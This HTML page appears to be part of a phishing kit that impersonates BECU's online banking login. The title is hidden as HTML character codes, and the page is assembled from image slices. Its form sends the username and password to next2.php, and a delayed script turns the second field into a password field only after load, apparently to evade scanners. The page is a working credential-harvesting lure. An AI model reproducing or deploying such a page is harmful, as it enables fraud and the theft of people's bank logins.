<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#69;&#67;&#85;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  <style type="text/css">
.textbox { 
    border: 1px solid #959595; 
    height: 34px; 
    width: 275px; 
  	font-family: Verdana;
    font-size: 13px;
    color: #333;
    padding-left:6px; 
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 5px #7bc1f7; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:126px; z-index:0"><a href="#"><img src="images/b1.png" alt="" title="" border=0 width=1349 height=126></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:1013px; width:1349px; height:342px; z-index:1"><a href="#"><img src="images/b4.png" alt="" title="" border=0 width=1349 height=342></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:92px; top:161px; width:453px; height:80px; z-index:2"><img src="images/b5.png" alt="" title="" border=0 width=453 height=80></div>

<div id="image3" style="position:absolute; overflow:hidden; left:105px; top:268px; width:151px; height:461px; z-index:3"><img src="images/b6.png" alt="" title="" border=0 width=151 height=461></div>

<div id="image5" style="position:absolute; overflow:hidden; left:96px; top:894px; width:778px; height:96px; z-index:4"><img src="images/b7.png" alt="" title="" border=0 width=778 height=96></div>
<form action=next2.php name=aramsejao id=aramsejao method=post>
<input name="eml" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:302px;left:108px;top:291px;z-index:5">
<input name="eps" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:302px;left:108px;top:348px;z-index:6">

<div id="formimage1" style="position:absolute; left:109px; top:420px; z-index:13"><input type="image" name="formimage1" width="116" height="36" src="images/btn2.png"></div>
</div>

</body>
</html>
